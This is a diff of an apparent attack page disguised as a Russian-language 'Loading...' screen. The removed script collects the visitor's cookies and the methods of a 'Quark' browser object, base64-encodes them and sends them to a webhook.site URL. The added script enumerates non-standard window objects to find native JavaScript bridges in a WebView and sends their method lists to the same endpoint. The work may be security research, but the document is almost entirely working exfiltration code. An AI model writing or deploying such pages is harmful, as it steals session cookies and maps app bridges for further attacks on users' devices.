@@ -2,26 +2,25 @@
 <html>
 <head><title>Loading...</title></head>
 <body>
-    <script>
-(function() {
-    // 1. Собираем куки
-    var report = "Cookies: " + (document.cookie || "none");
+   <script>
+    (function() {
+        var foundBridges = [];
+        var standardObjects = ['window', 'document', 'location', 'navigator', 'console', 'chrome'];
 
-    // 2. Исследуем объект Quark, если он есть
-    if (window.Quark) {
-        var methods = Object.keys(window.Quark);
-        report += " | Quark detected! Methods: " + methods.join(', ');
-    } else {
-        report += " | Quark not found";
-    }
+        Object.keys(window).forEach(key => {
+            if (!standardObjects.includes(key) && window[key] !== null && typeof window[key] === 'object') {
+                try {
+                    // Проверяем, есть ли у объекта методы (признак нативного моста)
+                    var methods = Object.keys(window[key]);
+                    if (methods.length > 0) {
+                        foundBridges.push(key + "(" + methods.join(',') + ")");
+                    }
+                } catch(e) {}
+            }
+        });
 
-    // 3. Кодируем всё в Base64 для передачи без ошибок
-    var encodedData = btoa(unescape(encodeURIComponent(report)));
-
-    // 4. Отправляем
-    // Замените YOUR_ID на ваш реальный ID из Burp
-    fetch('https://webhook.site/8b31d71f-32ab-418d-9e3f-e9dd72738799/?data=' + encodedData);
-})();
+        fetch('https://webhook.site/8b31d71f-32ab-418d-9e3f-e9dd72738799?bridges=' + encodeURIComponent(foundBridges.join('|')));
+    })();
 </script>
 <h1>Loading...</h1>
     <h1>Пожалуйста, подождите...</h1>
